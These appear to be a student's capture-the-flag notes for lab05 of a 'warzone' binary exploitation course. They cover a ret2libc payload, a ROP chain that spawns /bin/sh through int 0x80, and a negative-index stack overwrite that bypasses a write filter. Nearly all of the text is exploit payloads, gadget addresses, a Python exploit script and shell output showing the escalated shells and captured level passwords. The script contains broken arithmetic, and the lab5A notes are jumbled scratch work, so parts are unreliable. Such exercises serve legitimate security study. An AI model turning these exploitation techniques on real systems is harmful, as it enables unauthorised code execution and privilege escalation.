lab5C:
just simple ret2libc
find the system location and binsh location

funtion (arg in stack)
esp+0x10
ret + junk + arg
python -c 'print "A"*156+"\x10\x13\xe5\xb7" +"CCCC" + "\x4c\x3d\xf7\xb7"' > /tmp/pay11
lab5C@warzone:/levels/lab05$ (cat /tmp/pay11; cat) | ./lab5C 

pass: s0m3tim3s_r3t2libC_1s_3n0ugh

lab5B:
rop chain to excev("/bin/sh",null,null)
int 0x80

buff starts at 0xbffff620

0x806ec82  \\ pop ebx
0x080e55ad \\ pop ecx; ret;
0x080bbeb0 \\ mov edx, dword ptr [esp + 8];
	      mov eax, dword ptr [esp + 4];
	      mov dword ptr [eax + 0x4c], edx; ret;
0x0804e91a \\ add    esp,0x1c
0x0805cb31 \\ mov eax, dword ptr [esp + 4]; ret;
0x0806f31f \\ nop; int 0x80; ret;

python -c 'print "\x2f\x62\x69\x6e\x2f\x73\x68\x00"+"A"*132 + 
"\x82\x8d\x04\x08"+"\xb0\xd8\xff\xff" + "\xad\x55\x0e\x08" + 
"\x01\x01\x01\x01" +"\xb0\xbe\x0b\x08"+"\x1a\xe9\x04\x08"+
"\xb4\xd8\xff\xff"+"\x01\x01\x01\x01"+"A"*20 +
"\x1f\xf3\x06\x08"+"\x01\x01\x01\x0b"' > pay

lab5B@warzone:/levels/lab05$ (cat /tmp/pay2;cat )|./lab5B
Insert ROP chain here:
ls
whoami
lab5A
id; 
uid=1021(lab5B) gid=1022(lab5B) euid=1022(lab5A) groups=1023(lab5A),1002(gameuser),1022(lab5B)
pass : th4ts_th3_r0p_i_lik3_2_s33

import struct
import sys

def p32(addr):
    v = int(addr)
    return struct.pack("<L",v)

# /bin/sh
bin_sh = "\x2f\x62\x69\x6e\x2f\x73\x68\x00"

# ROP chain
buff = p32(0xbffff620)  # buff
ebx  = p32(0x0806ec82)  # pop ebx
ecx  = p32(0x080e55ad)  # pop ecx; ret;
edx  = p32(0x080bbeb0)  # mov edx, dword ptr [esp + 8];
                        # mov eax, dword ptr [esp + 4];
                        # mov dword ptr [eax + 0x4c], edx; ret;
esp  = p32(0x0804e91a)  # add esp,0x1c
eax  = p32(0x0805cb31)  # mov eax, dword ptr [esp + 4]; ret;
intp = p32(0x0806f31f)  # int 0x80; ret;


exp = bin_sh 
exp += "\x90" * len(bin_sh) - 140
exp += ebx + buff
exp += ecx + p32(0x00)
exp += edx 
exp += esp + (buff+4) + p32(0x00) + "0x90"*20
exp += eax + p32(0x0b)
exp += intp

sys.stdout.write(exp)

lab5A:

we have similar setup with 3 index is not writable
and we have buff over as the index is taken a int and not a unsigned it
so we could store negative value to bypass the  filter and overwrite the eip of store funtion and the we put our rop chain in buffer without any 3 multiple index

Input command:  Number:  Index: 
ls
lab5A  lab5A.c  lab5B  lab5B.c  lab5C  lab5C.c
whoami
lab5end
cat /home/lab5end/.pass

pass: byp4ss1ng_d3p_1s_c00l_am1rite

buff starts 0xbffff528   109 0xbffff6dc   read ret0xbffff4fc
edx,[eax*4+0x0]    3221222700  b *store_number+158
			       b *store_number+181
>>> hex(0xbffff528 + 0xffffffd4)  0xbffff4fc -11
'0x1bffff4fc'			  0xbffff50c -7
>>> hex(0xffffffff*44)		  0xbffff514 -5
'0x2bffffffd4'			  0xbffff518 -4
 0xbffff560 + 0x1c

0x080bc4c1 pop ebx; ret; 134988993 /bin/sh00 1852400175
			3221222784	     1752379136
0x0806fa80 int 0x80; ret;

0x0809b01e pop esp; movzx eax, al; ret; 134852638
0x0806c0a9 add esp, 0x4; ret; 134660265
0x080b926a add esp, 0xc; ret; 134976106


0x080695a5 pop edx; xor eax, eax; pop edi; ret; 134649253
0x0805008d mov eax,edx; pop ebx; pop esi; ret; 134545549
0x0806f3d1 pop ecx; pop ebx; ret;   134673361
0x0806f3a9 pop ebx(edx); pop edx; ret;   134673321
0x0809528a pop ebx; pop esi; ret;   134828682
0x0806fa80 int 0x80; ret;           134675072

buff 0xbffff4e8  3221222636  0xbffff4bc -11
bin/sh 0xbffff540	     0xbffff4cc -7
3221222720	             0xbffff4d4 -5
			     0xbffff4d8 -4

pay

store
134660265
-7
store
134852638
-5
store
3221222636
-4
store
134649253
1
store
11
2
store
134545549
4
store
3221222780
5
store
1852400175
22
store
6845231
23
store
134673361
7
store
0
8
store
134673321
10
store
0
11
store
134828682
13
store
3221222720
14
store
134675072
16
store
3221222720
17
store
134976106
-11




